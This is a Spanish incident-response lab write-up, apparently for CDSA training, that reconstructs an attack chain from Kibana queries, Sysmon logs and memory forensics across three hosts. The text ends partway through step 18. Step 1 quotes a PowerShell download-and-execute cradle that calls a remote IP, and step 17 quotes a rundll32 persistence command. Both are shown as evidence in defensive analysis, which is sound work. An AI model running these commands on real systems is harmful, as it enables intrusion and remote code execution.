Caso de laboratorio CDSA. Consultas en **Kibana Query Language (KQL de Kibana)**, distinto de Kusto Query Language. La telemetría corresponde al entorno de entrenamiento, no a un cliente real.

Una captura seleccionada y revisada acompaña este caso. El análisis restante conserva las consultas y tablas del informe; las capturas no revisadas se han omitido.

## Resumen de la cadena de ataque

| Fase                           | Pasos | Host(s)          | Hora (25 ago)         |
| ------------------------------ | ------ | ---------------- | --------------------- |
| Acceso inicial y ejecución     | 1–2    | `PURPLE`         | 03:38:19 – 03:38:42   |
| Descubrimiento                 | 3–5    | `PURPLE`         | 03:39:17 – 03:43:44   |
| Inyección de procesos y bypass de UAC | 6–7 | `PURPLE`       | 03:41:22 – 03:45:37   |
| Persistencia en PURPLE         | 8–9    | `PURPLE`         | 03:50:25              |
| Kerberoasting y movimiento lateral | 10–14 | `PURPLE` → `IIS` | 03:48:55 – 04:13:35 |
| Post-explotación en IIS        | 15–17  | `IIS`            | 04:02:11 – 04:07:30   |
| Compromiso del controlador de dominio | 18–20 | `DC01`     | 04:09:26 – 04:11:53   |

## Paso 1 — Identificación del proceso malicioso

### Consulta KQL de Kibana · Paso 1

```kql
event.code: "1" and (winlog.event_data.CommandLine: *invoice.doc* or winlog.event_data.ParentImage: *WINWORD.EXE)
```

```text
@timestamp
winlog.event_data.User
winlog.event_data.Image
winlog.event_data.ProcessId
winlog.event_data.ParentImage
winlog.event_data.ParentProcessId
winlog.event_data.CommandLine
winlog.event_data.ParentCommandLine
winlog.computer_name
```
### Evidencia · Paso 1

![Elastic: proceso PowerShell hijo de WINWORD y apertura de invoice.doc](/images/cases/elastic-process-tree.png)

### Análisis técnico · Paso 1

Los registros de Sysmon Event ID 1 permiten reconstruir la siguiente secuencia:

|Hora (25/08/2023)|Proceso|PID|Actividad|
|---|---|---|---|
|03:38:26.791|`WINWORD.EXE`|4760|Apertura de `invoice.doc`|
|03:38:32.061|`ai.exe`|3904|Componente de Microsoft Office|
|03:38:37.687|`powershell.exe`|4900|Ejecución sospechosa|

**Host:** `PURPLE.corp.local`  
**Usuario:** `CORP\Marty.McFly`  
**Documento:** `C:\Users\Marty.Mcfly\Downloads\invoice.doc`

**Comando sospechoso:**

```text
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://18.207.78.25:80/officeupdate'))"
```

El proceso PowerShell utiliza `-nop` para omitir perfiles, `-w hidden` para ocultar la ventana y `IEX` junto con `DownloadString` para intentar descargar y ejecutar código remoto en memoria.

### Conclusión · Paso 1

**Actividad maliciosa identificada con alta confianza.** La apertura de `invoice.doc` desencadenó la ejecución de PowerShell mediante `WINWORD.EXE`, aproximadamente 11 segundos después.

- **Proceso malicioso:** `powershell.exe`
- **PID:** `4900`
- **Proceso padre:** `WINWORD.EXE` (PID `4760`)
- **Indicador de red:** `18.207.78.25:80`
- **Estado:** Ejecución confirmada; descarga del payload no verificada.

## Paso 2 — Identificación de la IP del C2

### Consulta KQL de Kibana · Paso 2

Para identificar la infraestructura de comando y control (C2), analizamos las conexiones de red de `powershell.exe` (PID `4900`) mediante **Sysmon Event ID 3 (Network Connection)**, con el objetivo de determinar la IP de destino asociada a la actividad maliciosa.

```kql
event.code: "3" and winlog.event_data.ProcessId: "4900"
```

### Análisis técnico · Paso 2

|Campo|Valor|
|---|---|
|Evento|Sysmon ID 3 (conexión de red)|
|Fecha y hora|2023-08-25 03:38:42.855|
|Host|`PURPLE.corp.local`|
|Proceso|`powershell.exe` — PID `4900`|
|Destino|`18.207.78.25:80`|
|Initiated|`true`|

PowerShell inició una conexión HTTP hacia `18.207.78.25:80`, cinco segundos después de su ejecución. La IP coincide con la identificada en el comando malicioso de el paso 1
### Conclusión  · Paso 2

Sysmon Event ID 3 confirma que `powershell.exe` (PID `4900`) inició una conexión hacia `18.207.78.25:80` a las `03:38:42.855`, cinco segundos después de su creación. La dirección coincide con el servidor especificado en el comando malicioso de el paso 1
### Verificación de la descarga y ejecución del payload mediante PowerShell · Paso 2

1. PowerShell Script Block Logging (4104)

```kql
winlog.computer_name: "PURPLE.corp.local" and event.code: "4104" and @timestamp >= "2023-08-25T03:38:30" and @timestamp <= "2023-08-25T03:39:30"
```

```kql
winlog.computer_name: "PURPLE.corp.local" and event.code: "4104" and winlog.event_data.ScriptBlockId: "6b2682f3-55cd-4b94-8a89-25aa12609203"
```

|Campo|Hallazgo|
|---|---|
|Host|`PURPLE.corp.local`|
|Eventos|42 registros — Event ID `4104`|
|03:38:40.847|`IEX` + `DownloadString` hacia `18.207.78.25`|
|03:38:41.306|Segundo script con `IO.MemoryStream` y `FromBase64String`|
|ScriptBlockId|`6b2682f3-55cd-4b94-8a89-25aa12609203`|
|Fragmentos|13, correspondientes al mismo script|
|Diferencia temporal|459 ms entre ambos registros|

Se registró el procesamiento de código PowerShell codificado inmediatamente después del comando de descarga. Esto constituye evidencia indirecta sólida de una posible descarga y ejecución del payload, pero todavía no confirma su procedencia ni una respuesta HTTP exitosa.


## Paso 3 — Ejecutable generado por el proceso malicioso

### Consulta KQL de Kibana · Paso 3

Mediante **Sysmon Event ID 11 (FileCreate)**, examinamos los archivos creados por `powershell.exe` (PID `4900`) en `PURPLE.corp.local`, con el objetivo de identificar el ejecutable generado y obtener su ruta completa.

```kql
event.code: "11" and winlog.computer_name: "PURPLE.corp.local" and winlog.event_data.ProcessId: "4900"
```
### Análisis técnico — Sysmon ID 11 · Paso 3

|Hora|Proceso|Archivo creado|Evaluación|
|---|---|---|---|
|03:38:20|`7zG.exe`|`invoice.doc`|Extracción previa|
|03:38:40|`powershell.exe`|Archivo temporal `.ps1`|Actividad PowerShell|
|03:40:10|`powershell.exe`|`SharpHound.exe`|Ejecutable identificado|
|03:41:46|`powershell.exe`|`StartupProfileData-NonInteractive`|Archivo de perfil|
Ejecutable generado: `C:\Users\Marty.Mcfly\AppData\Local\SharpHound.exe`

- Proceso creador: `powershell.exe` · PID `4900`
- Timestamp: `2023-08-25 03:40:10.279`
- ProcessGuid: `{29CECF4D-84AD-64E8-7402-000000008102}`
- Detalle importante: `7zG.exe` utilizó anteriormente el mismo PID `4900`, pero tiene un `ProcessGuid` diferente. Eso demuestra por qué no debemos atribuir todos los eventos únicamente por PID.

## Paso 4 — Comando ejecutado por el proceso malicioso

### Consulta (KQL de Kibana) · Paso 4

Identificar el comando ejecutado por `powershell.exe` (PID `4900`) durante la actividad maliciosa, utilizando Sysmon Event ID 1 (Process Creation) para examinar los procesos hijos y sus líneas de comandos.

```kql
event.code: "1" and winlog.computer_name: "PURPLE.corp.local" and winlog.event_data.ParentProcessId: "4900"
```

```text
@timestamp
winlog.computer_name
winlog.event_data.Image
winlog.event_data.ProcessId
winlog.event_data.ParentImage
winlog.event_data.ParentProcessId
winlog.event_data.CommandLine
```

### Análisis técnico · Paso 4

|Campo|Valor|
|---|---|
|Evento|Sysmon ID 1 (Process Creation)|
|Fecha y hora|`2023-08-25 03:39:17.260`|
|Host|`PURPLE.corp.local`|
|Proceso padre|`powershell.exe` — PID `4900`|
|Proceso hijo|`cmd.exe` — PID `6952`|
|Comando|`C:\Windows\system32\cmd.exe /C whoami /all`|

### Conclusión · Paso 4

PowerShell inició `cmd.exe` para ejecutar `whoami /all`, enumerando la identidad del usuario, sus grupos y privilegios de seguridad. Esta actividad es compatible con reconocimiento posterior al compromiso.

## Paso 5 — Identificación del proceso responsable de eventos LDAP

### Consulta (KQL de Kibana) · Paso 5

Tras identificar la creación de `SharpHound.exe`, investigamos posibles actividades de reconocimiento de Active Directory mediante consultas LDAP. Para ello, analizamos la telemetría de SilkService Collector, con el objetivo de identificar el proceso que concentra la mayor cantidad de eventos LDAP y determinar su PID.

```kql
winlog.provider_name: "SilkService Collector" and winlog.computer_name: "PURPLE.corp.local" and @timestamp >= "2023-08-25T00:00:00" and @timestamp < "2023-08-26T00:00:00"
```
```kql
winlog.provider_name: "SilkService Collector" and winlog.computer_name: "PURPLE.corp.local" and SilkServiceProcessId: "6904"
```

### Análisis técnico · Paso 5

|Campo|Resultado|
|---|---|
|Host|`PURPLE.corp.local`|
|Fuente|`SilkService Collector`|
|Proceso|`SharpHound`|
|PID|`6904`|
|Event ID|`3`|
|Hora observada|`2023-08-25 03:42:43`|
|Frecuencia|2.223 registros (88,5 % en la estadística mostrada)|

### Conclusión · Paso 5

`SharpHound` (PID `6904`) concentra la mayor cantidad de eventos registrados por SilkService en el host investigado. Esto refuerza la evidencia de reconocimiento de Active Directory. La captura identifica el proceso

## Paso 6 — Inyección de procesos

### Consulta (KQL de Kibana) · Paso 6

Investigar si `powershell.exe` (PID `4900`) realizó una inyección de código en otro proceso. Utilizaremos Sysmon Event ID 8 (CreateRemoteThread) para identificar el proceso de destino y obtener su PID.

```kql
event.code: "8" and winlog.computer_name: "PURPLE.corp.local" and winlog.event_data.SourceProcessId: "4900"
```

### Análisis técnico · Paso 6

|Campo|Resultado|
|---|---|
|Evento|Sysmon ID 8 — CreateRemoteThread|
|Hora|`2023-08-25 03:41:22.185`|
|Host|`PURPLE.corp.local`|
|Proceso origen|`powershell.exe` — PID `4900`|
|Proceso destino|`explorer.exe` — PID `5276`|
|ProcessGUID|No disponible|

### Conclusión · Paso 6

PowerShell creó un hilo remoto dentro de `explorer.exe`, comportamiento compatible con inyección de procesos

## Paso 7 — Bypass de UAC mediante el registro

### Consulta KQL de Kibana · Paso 7

Tras detectar la creación de un hilo remoto en `explorer.exe` (PID `5276`), investigamos modificaciones del Registro de Windows mediante **Sysmon Event ID 12, 13 y 14**, buscando indicios de un intento de bypass de UAC.

```kql
winlog.computer_name: "PURPLE.corp.local" and event.code: ("12" or "13" or "14") and winlog.event_data.TargetObject: *ms-settings*
```

### Evidencia · Paso 7

- [ ] Modificaciones del registro

Se identificaron dos modificaciones de valores bajo `ms-settings\Shell\Open\command`, realizadas mediante `reg.exe`.

- [ ] Líneas de comandos de reg.exe

Para recuperar la ruta original del registro y los valores escritos, examinamos los eventos de creación de los procesos `reg.exe`.

**Consulta KQL**

```kql
event.code: "1" and winlog.computer_name: "PURPLE.corp.local" and winlog.event_data.Image: *reg.exe and winlog.event_data.ProcessId: ("4136" or "6984")
```

- [ ] Activación del bypass

Comprobamos la ejecución de `fodhelper.exe`, componente legítimo de Windows asociado con esta técnica de evasión de UAC.

**Consulta KQL**

```kql
event.code: "1" and winlog.computer_name: "PURPLE.corp.local" and winlog.event_data.Image: *fodhelper.exe
```

### Análisis técnico · Paso 7

|Hora (25/08/2023)|Proceso|PID|Actividad|
|---|---|---|---|
|03:44:45|`reg.exe`|`6984`|Establece `DelegateExecute` vacío|
|03:45:07|`reg.exe`|`4136`|Configura PowerShell codificado en `(Default)`|
|03:45:36–37|`fodhelper.exe`|`1692`, `6588`, `6388`|Tres ejecuciones desde `cmd.exe` (PID `6556`)|

**Ruta del registro identificada:**

```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```

La combinación de `DelegateExecute` vacío, un comando PowerShell codificado y la ejecución posterior de `fodhelper.exe` corresponde al patrón de bypass de UAC mediante `ms-settings`.

### Conclusión · Paso 7

La evidencia confirma las modificaciones del registro y la ejecución de `fodhelper.exe`, compatibles con un **intento de bypass de UAC (MITRE ATT&CK T1548.002)**.

## Paso 8 — Persistencia en PURPLE: tarea programada

### Consulta KQL de Kibana · Paso 8

Tras identificar el intento de bypass de UAC, investigamos modificaciones del Registro de Windows mediante **Sysmon Event ID 12, 13 y 14**, con el objetivo de detectar posibles mecanismos de persistencia en `PURPLE.corp.local`.

```kql
winlog.computer_name: "PURPLE.corp.local" and event.code: ("12" or "13" or "14") and winlog.event_data.TargetObject: *CurrentVersion*
```

### Análisis técnico · Paso 8

|Campo|Resultado|
|---|---|
|Fecha y hora|`2023-08-25 03:50:25.538`|
|Host|`PURPLE.corp.local`|
|Evento|Sysmon ID 13 (Registry Value Set)|
|Proceso|`svchost.exe`|
|PID|`1844`|
|Tarea identificada|`ExplorerUpdater`|
|Valores registrados|`Id`, `Index`, `SD`|
|Task GUID|`{18CE68B5-510A-4780-A3F0-043BA1DEC3CA}`|

**Ruta del registro:**

```text
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\ExplorerUpdater
```

Se identificaron tres modificaciones asociadas a `ExplorerUpdater`. La ubicación `TaskCache\Tree` corresponde al almacenamiento de tareas programadas de Windows. Los demás registros observados no presentan relación directa con este hallazgo.

### Conclusión · Paso 8

Se confirma el registro de la tarea programada `ExplorerUpdater` en `PURPLE.corp.local`, compatible con un mecanismo de persistencia mediante tareas programadas (**MITRE ATT&CK T1053.005**).

## Paso 9 — Comando de persistencia en PURPLE

### Consulta KQL de Kibana · Paso 9

Identificar el comando ejecutado por la tarea programada `ExplorerUpdater`, descubierta en el paso 8, para determinar qué ejecutable utiliza como mecanismo de persistencia.

```kql
winlog.computer_name: "PURPLE.corp.local" and event.code: "11" and winlog.event_data.TargetFilename: *ExplorerUpdater*
```
**Análisis técnico:** A las 03:50:25.540, `svchost.exe` (PID `1844`) creó `C:\Windows\System32\Tasks\ExplorerUpdater` (Sysmon ID 11).

Tras identificar la creación de `ExplorerUpdater` en `C:\Windows\System32\Tasks\` mediante Sysmon Event ID 11, utilizamos los artefactos forenses recopilados por KAPE para examinar la definición XML de la tarea programada. Esto nos permite identificar su disparador (`LogonTrigger`), la cuenta bajo la que se ejecuta y, especialmente, el comando configurado en `<Command>`, necesario para determinar el mecanismo de persistencia y calcular el MD5 del ejecutable.

```powershell
Get-ChildItem -Path . -Recurse -File -Filter "ExplorerUpdater" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName
Get-Content -LiteralPath '.\PURPLE-C.0bebbf7fbb913ddd\uploads\auto\C%3A\Windows\System32\Tasks\ExplorerUpdater' -Raw
```

### Análisis técnico · Paso 9

|Campo|Valor|
|---|---|
|Tarea|`ExplorerUpdater`|
|Disparador|`LogonTrigger` (al iniciar sesión)|
|Principal|`SYSTEM`, `InteractiveToken`, `LeastPrivilege`|
|Comando|`C:\Users\Marty.Mcfly\AppData\Local\explorer.exe`|

El ejecutable se encuentra en el perfil del usuario, fuera de la ubicación legítima `C:\Windows\explorer.exe`, y comparte directorio con `SharpHound.exe`, identificado previamente. Su ubicación y nombre sugieren un intento de suplantación de un proceso legítimo de Windows.

### Conclusión · Paso 9

Se confirma la configuración de persistencia mediante la tarea programada `ExplorerUpdater` (MITRE ATT&CK T1053.005), activada al iniciar sesión (`LogonTrigger`). La tarea está configurada para ejecutar un `explorer.exe` sospechoso desde el perfil del usuario
## Paso 10 — Kerberoasting: cuenta de servicio objetivo

### Consulta KQL de Kibana · Paso 10

Investigamos posibles actividades de **Kerberoasting** mediante el Event ID 4769 de Windows, que registra las solicitudes de tickets de servicio Kerberos (TGS). El objetivo es identificar cuentas de servicio potencialmente atacadas mediante solicitudes de tickets cifrados que podrían utilizarse para intentar recuperar contraseñas offline.

```kql
event.code: "4769" and winlog.event_data.ServiceName: *svc*
```

### Análisis técnico · Paso 10

|Campo|Valor|
|---|---|
|Fecha y hora|`2023-08-25 03:48:55.528`|
|Evento|Security ID 4769 (TGS Request)|
|Cuenta de servicio|`iis_svc`|
|Solicitante|`Marty.McFly@CORP.LOCAL`|
|IP de origen|`10.100.0.220`|
|Cifrado|`0x17` (RC4-HMAC)|
|Estado|`0x0` (éxito)|

Se identificó una solicitud exitosa de un ticket Kerberos para `iis_svc`, utilizando cifrado RC4-HMAC desde `10.100.0.220`, dirección asociada al host comprometido `PURPLE.corp.local`. Los dos eventos anteriores, registrados el 18 de agosto, corresponden a `Administrator` desde `::1` y no presentan relación temporal con el incidente.

### Conclusión · Paso 10

La solicitud de un ticket TGS para `iis_svc` mediante RC4-HMAC desde el host comprometido es **compatible con una actividad de Kerberoasting (MITRE ATT&CK T1558.003)**. Se confirma la emisión exitosa del ticket.

## Paso 11 — Proceso asociado a la cuenta de servicio en PURPLE

### Consulta KQL de Kibana · Paso 11

Investigamos los procesos asociados a la cuenta de servicio `iis_svc` en `PURPLE.corp.local`, identificada durante la actividad de Kerberoasting. El objetivo es determinar qué ejecutable opera bajo esta identidad y obtener su PID.

```kql
winlog.computer_name: "PURPLE.corp.local" and (winlog.event_data.TargetUser: *iis_svc* or winlog.event_data.User: *iis_svc*)
```

### Análisis técnico · Paso 11

|Campo|Valor|
|---|---|
|Evento|Sysmon ID 3 (Network Connection)|
|Host|`PURPLE.corp.local`|
|Proceso|`C:\Windows\SysWOW64\svchost.exe`|
|PID|`6196`|
|Usuario|`CORP\iis_svc`|
|Horario|`2023-08-25 04:12:22 – 04:13:35`|

Se identificaron conexiones de red realizadas por `svchost.exe` (PID `6196`) bajo la identidad `CORP\iis_svc`. La ejecución de un `svchost.exe` de 32 bits desde `SysWOW64` asociado a una cuenta de servicio de dominio constituye un comportamiento anómalo que merece atención.

### Conclusión · Paso 11

Se confirma que `svchost.exe` **(PID** `6196`**)** está asociado a la cuenta `CORP\iis_svc` en `PURPLE.corp.local`. Su actividad de red resulta sospechosa en el contexto del incidente

## Paso 12 — Identificación de la named pipe remota

### Consulta · Paso 12

Investigar los identificadores de archivos (handles) abiertos por `svchost.exe` (PID `6196`) en `PURPLE.corp.local`. Utilizaremos Volatility 3 para analizar su memoria y localizar posibles conexiones a named pipes remotas.

```powershell
$dump = Get-ChildItem 'C:\Users\Administrator\Desktop\memdumps' -Recurse -File -Filter 'PhysicalMemory.raw' |
    Where-Object { $_.FullName -match 'PURPLE' } |
    Select-Object -First 1 -ExpandProperty FullName

python "C:\Users\Administrator\Desktop\volatility3-develop\vol.py" -q -f "$dump" windows.handles --pid 6196 | Select-String -Pattern 'pipe' -Context 0,2
```

Imagen de memoria: `…\H.CJK8R201DGB22\PURPLE-C.0bebbf7fbb913ddd\uploads\auto\PhysicalMemory.raw`.

### Análisis técnico · Paso 12

|Evidencia|Resultado|
|---|---|
|Herramienta|Volatility 3|
|Proceso|`svchost.exe` — PID `6196`|
|Handle|`0x508`|
|Tipo|`File`|
|Host remoto|`10.100.0.24`|
|Named pipe|`dce_86`|

### Conclusión · Paso 12

El análisis de memoria confirma que `svchost.exe` mantiene un handle hacia la named pipe remota `dce_86`.

## Paso 13 — Proceso asociado a la named pipe en IIS

### Consulta KQL de Kibana · Paso 13

Tras identificar la named pipe remota `dce_86` en la memoria de `PURPLE`, investigamos su origen en `IIS.corp.local` mediante **Sysmon Event ID 17 (Pipe Created)**, con el objetivo de identificar el proceso responsable y obtener su PID.

```kql
event.code: "17" and winlog.computer_name: "IIS.corp.local" and winlog.event_data.PipeName: *dce_86*
```

### Análisis técnico · Paso 13

|Campo|Valor|
|---|---|
|Fecha y hora|`2023-08-25 04:01:28.972`|
|Evento|Sysmon ID 17 (Pipe Created)|
|Host|`IIS.corp.local`|
|Proceso|`C:\Windows\System32\rundll32.exe`|
|PID|`4680`|
|Named pipe|`\dce_86`|
|Usuario|`NT AUTHORITY\SYSTEM`|

Se identificó la creación de la named pipe `\dce_86` por `rundll32.exe` (PID `4680`) bajo la identidad `NT AUTHORITY\SYSTEM`. El nombre coincide con la pipe remota identificada previamente en los handles de `svchost.exe` (PID `6196`) de `PURPLE.corp.local`.

### Conclusión · Paso 13

Se confirma que `rundll32.exe` (PID `4680`) creó la named pipe `\dce_86` en `IIS.corp.local`, estableciendo una correlación entre ambos hosts mediante el mismo identificador.

## Paso 14 — Línea de comandos del proceso padre en IIS

### Consulta KQL de Kibana · Paso 14

Investigamos la relación padre-hijo de `rundll32.exe` (PID `4680`) en `IIS.corp.local` mediante **Sysmon Event ID 1 (Process Creation)**, con el objetivo de identificar el proceso responsable de su ejecución y recuperar su línea de comandos original.

```kql
event.code: "1" and winlog.computer_name: "IIS.corp.local" and winlog.event_data.ProcessId: "4680"
```

### Análisis técnico · Paso 14

|Campo|Valor|
|---|---|
|Fecha y hora|`2023-08-25 04:01:28.903`|
|Host|`IIS.corp.local`|
|Evento|Sysmon ID 1 (Process Creation)|
|Proceso hijo|`rundll32.exe` — PID `4680`|
|Proceso padre|`488e74c.exe` — PID `3972`|
|ParentCommandLine|`\\10.100.0.24\ADMIN$\488e74c.exe`|

Se identificó que `rundll32.exe` fue iniciado por `488e74c.exe`, cuya línea de comandos apunta al recurso compartido administrativo `ADMIN$` del host `10.100.0.24`.

El evento de `ROUTE.EXE` del 18 de agosto corresponde a una instancia anterior que reutilizó el PID `4680`, por lo que se excluye del análisis.

La actividad de registro documentada en el paso 17 muestra modificaciones en `HKLM\System\CurrentControlSet\Services\488e74c` realizadas por `services.exe`, coherentes con la ejecución mediante un servicio de corta duración.

### Conclusión · Paso 14

Se confirma que `rundll32.exe` (PID `4680`) fue iniciado por un ejecutable ubicado en el recurso administrativo `ADMIN$`. Este comportamiento es compatible con ejecución remota mediante servicios, aunque la relación padre-hijo no demuestra por sí sola el mecanismo exacto de ejecución remota.

## Paso 15 — Identificación de OriginalFilename en svchost.exe

### Consulta KQL de Kibana · Paso 15

Investigamos el proceso `svchost.exe` (PID `2928`) en `IIS.corp.local` mediante **Sysmon Event ID 8 (CreateRemoteThread)** para identificar el origen de una posible inyección de código. Posteriormente, analizamos su memoria con Volatility 3 para recuperar el campo `OriginalFilename` de la herramienta sospechosa.

```kql
event.code: "8" and winlog.computer_name: "IIS.corp.local" and winlog.event_data.TargetProcessId: "2928"
```

### Evidencia · Paso 15

- [ ] 15.1 - Origen de la inyección

Se identificó la creación de un hilo remoto desde `rundll32.exe` (PID `4680`) hacia `svchost.exe` (PID `2928`) a las `04:02:11.552`. El proceso origen corresponde al identificado en las Tasks 13–14.

- 15.2 - Análisis de memoria con Volatility 3

Examinamos las regiones de memoria del PID `2928` mediante `windows.malfind` para localizar posibles indicios de código inyectado.

```powershell
$iisDump = Get-ChildItem 'C:\Users\Administrator\Desktop\memdumps' -Recurse -File -Filter 'PhysicalMemory.raw' |
    Where-Object { $_.FullName -match 'IIS-C\.' } |
    Select-Object -First 1 -ExpandProperty FullName

python "C:\Users\Administrator\Desktop\volatility3-develop\vol.py" -q -f "$iisDump" windows.malfind --pid 2928 | Select-String -Pattern '^\s*2928\s+svchost\.exe\s+0x'
```

El análisis identificó **cuatro regiones de memoria** `**PAGE_EXECUTE_READWRITE**`, compatibles con código inyectado y coherentes con el evento Sysmon ID 8.

- [ ] 15.3 - Recuperación de OriginalFilename

Analizamos el volcado de memoria `pid.2928.dmp` para localizar los metadatos originales de la herramienta.

```powershell
@'
import mmap, sys

with open(sys.argv[1], "rb") as f:
    with mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ) as data:
        for term in ("OriginalFilename", "Rubeus.exe"):
            for enc in ("ascii", "utf-16le"):
                needle = term.encode(enc)
                pos = data.find(needle)
                if pos == -1:
                    continue

                start = max(0, pos - 100)
                end = min(len(data), pos + 300)
                chunk = bytes(data[start:end])

                print(f"\n{term} [{enc}] Offset: {hex(pos)}")
                print(chunk.decode(enc, errors="replace").replace("\x00", " "))
'@ | python - "C:\Users\Administrator\Desktop\Task15\FullMemory\pid.2928.dmp"
```

### Análisis técnico · Paso 15

|Campo|Resultado|
|---|---|
|Host|`IIS.corp.local`|
|Evento|Sysmon ID 8 (CreateRemoteThread)|
|Fecha y hora|`2023-08-25 04:02:11.552`|
|Proceso origen|`rundll32.exe` — PID `4680`|
|Proceso destino|`svchost.exe` — PID `2928`|
|Regiones sospechosas|4 (`PAGE_EXECUTE_READWRITE`)|
|OriginalFilename|`Rubeus.exe`|
|ProductName|`Rubeus`|
|ProductVersion|`1.0.0.0`|

El análisis de memoria permitió recuperar metadatos que identifican `Rubeus.exe`, además de cadenas de uso de la herramienta, como `Rubeus.exe asktgt /user:USER`. Estos hallazgos respaldan la presencia de Rubeus en la memoria del proceso investigado.

### Conclusión · Paso 15

Se identificaron indicios de **inyección de código en** `**svchost.exe**` **(PID** `**2928**`**)** por parte de `rundll32.exe` (PID `4680`). El análisis forense de memoria recuperó el campo `OriginalFilename: Rubeus.exe`, identificando una herramienta asociada al abuso de autenticación Kerberos. La evidencia respalda su presencia en memoria, sin demostrar por sí sola las operaciones realizadas.

## Paso 16 — Identificación del proceso de escaneo de puertos en IIS

### Consulta KQL de Kibana · Paso 16

Investigamos las conexiones salientes desde `IIS.corp.local` mediante **Sysmon Event ID 3 (Network Connection)**, con el objetivo de identificar procesos que realizan conexiones hacia múltiples hosts y puertos en intervalos cortos, comportamiento compatible con reconocimiento de red.

```kql
event.code: "3" and winlog.computer_name: "IIS.corp.local" and winlog.event_data.Initiated: "true"
```

### Evidencia · Paso 16

- [ ] 16.1 — Identificación de conexiones salientes

La consulta devolvió **65 eventos de red**. Entre los resultados, identificamos el PID `2964` realizando conexiones hacia diferentes direcciones IP y puertos en un intervalo breve.

- [ ] 16.2 — Confirmación del proceso sospechoso

Filtramos los eventos por el PID `2964` para examinar sus conexiones y verificar que pertenecen a la misma instancia de proceso.

Consulta KQL

```kql
event.code: "3" and winlog.computer_name: "IIS.corp.local" and winlog.event_data.ProcessId: "2964"
```

### Análisis técnico · Paso 16

|Campo|Resultado|
|---|---|
|Fecha y hora|`2023-08-25 04:06:23 – 04:07:04`|
|Host|`IIS.corp.local`|
|Evento|Sysmon ID 3 (Network Connection)|
|Proceso|`C:\Windows\System32\svchost.exe`|
|PID|`2964`|
|ProcessGuid|`{4EBE3E8F-8AFB-64E8-CD02-000000004901}`|
|Conexiones registradas|9|
|Hosts de destino|4|

**Destinos identificados:**

|Dirección IP|Puertos|Servicios asociados|
|---|---|---|
|`10.100.0.17`|`22`|SSH|
|`10.100.0.24`|`3389`, `5985`|RDP, WinRM|
|`10.100.0.148`|`88`, `3389`, `5985`|Kerberos, RDP, WinRM|
|`10.100.0.194`|`22`|SSH|

Los nueve eventos comparten el mismo `ProcessGuid`, confirmando que corresponden a una única instancia de `svchost.exe` (PID `2964`). Este proceso es distinto de `svchost.exe` (PID `2928`), investigado en el paso 15.

### Conclusión · Paso 16

Se identificó actividad de reconocimiento de red compatible con un escaneo de puertos (MITRE ATT&CK T1046) realizada por `svchost.exe` (PID `2964`). El proceso inició conexiones hacia puertos asociados a servicios de administración y autenticación en cuatro hosts distintos. La telemetría confirma las conexiones registradas.
## Paso 17 — Mecanismo de persistencia en IIS

### Consulta KQL de Kibana · Paso 17

Investigamos las modificaciones del Registro de Windows en `IIS.corp.local` mediante **Sysmon Event ID 12, 13 y 14**, con el objetivo de identificar mecanismos de persistencia y recuperar el comando completo utilizado por el atacante.

```kql
winlog.computer_name: "IIS.corp.local" and event.code: ("12" or "13" or "14")
```

### Evidencia · Paso 17

- [ ] 17.1 — Identificación de actividad sospechosa en el registro

La consulta devolvió **4.730 eventobs de registro**. Entre los resultados, identificamos una modificación realizada por `svchost.exe` a las `04:07:30.615`, asociada a una clave `Run` utilizada por Windows para ejecutar programas durante el inicio de sesión.

- [ ] 17.2 — Análisis de la clave Run

Filtramos los eventos Sysmon ID 13 (Registry Value Set) para identificar los valores modificados bajo las claves de ejecución automática de Windows.

Consulta KQL

```kql
event.code: "13" and winlog.computer_name: "IIS.corp.local" and winlog.event_data.TargetObject: *CurrentVersion* and winlog.event_data.TargetObject: *Run*
```

### Análisis técnico · Paso 17

|Campo|Resultado|
|---|---|
|Fecha y hora|`2023-08-25 04:07:30.615`|
|Host|`IIS.corp.local`|
|Evento|Sysmon ID 13 (Registry Value Set)|
|Proceso responsable|`svchost.exe`|
|Clave modificada|`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\System`|
|Ejecutable|`rundll32.exe`|
|DLL sospechosa|`kerne132.dll`|
|Función invocada|`StartW`|

Comando de persistencia identificado:

```text
C:\Windows\system32\rundll32.exe C:\Windows\system32\kerne132.dll,StartW
```

La clave `Run` contiene un comando que utiliza `rundll32.exe` para cargar `kerne132.dll` e invocar su función `StartW`. El nombre `kerne132.dll` utiliza el dígito **1** para imitar visualmente a la DLL legítima `kernel32.dll`, comportamiento compatible con una técnica de suplantación de nombres. Los demás eventos identificados, como `RunOnce\GrpConv` del 18 de agosto y `RunNotification`, no presentan relación directa con esta actividad.

### Conclusión · Paso 17

Se confirma la configuración de persistencia mediante una clave del Registro Run (MITRE ATT&CK T1547.001) en `IIS.corp.local`. El mecanismo utiliza `rundll32.exe` para cargar una DLL sospechosa cuyo nombre imita un componente legítimo de Windows. La modificación del registro está confirmada.

## Paso 18 — Pass-the-Ticket: cuenta utilizada para acceder a DC01

### Consulta KQL de Kibana · Paso 18

Investigamos los inicios de sesión Kerberos en `DC01.corp.local` mediante Windows Security Event ID 4624 (Successful Logon), con el objetivo de identificar cuentas utilizadas para acceder remotamente al controlador de dominio y detectar posibles indicios de Pass-the-Ticket.

```kql
event.code: "4624" and winlog.computer_name: "DC01.corp.local" and winlog.event_data.AuthenticationPackageName: "Kerberos" and winlog.event_data.LogonType: "3" and not winlog.event_data.TargetUserName: "DC01$"
```

### Evidencia · Paso 18

- [ ] 18.1 — Identificación de inicios de sesión Kerberos

La consulta devolvió 3.449 eventos. Se identificaron inicios de sesión de red (Logon Type 3) desde `10.100.0.220`, dirección asociada a `PURPLE.corp.local`, utilizando las identidades `John.Snow` y `PURPLE$`.

- [ ] 18.2 — Análisis de solicitudes de tickets de servicio (TGS)

Examinamos los eventos 4769 (Kerberos Service Ticket Requested) para identificar las solicitudes realizadas por `John.Snow` y comparar sus direcciones de origen.

Consulta KQL

```kql
event.code: "4769" and winlog.computer_name: "DC01.corp.local" and winlog.event_data.TargetUserName: *John.Snow*
```

Se identificaron 56 resultados, incluidos eventos desde `10.100.0.24` a las `03:09` y desde `10.100.0.220` entre las `04:09` y `04:10`.

- [ ] 18.3 — Análisis de solicitudes de tickets TGT

Analizamos los eventos 4768 (Kerberos Authentication Service) para comprobar desde qué origen se solicitaron tickets de concesión de tickets (TGT) para la misma cuenta.
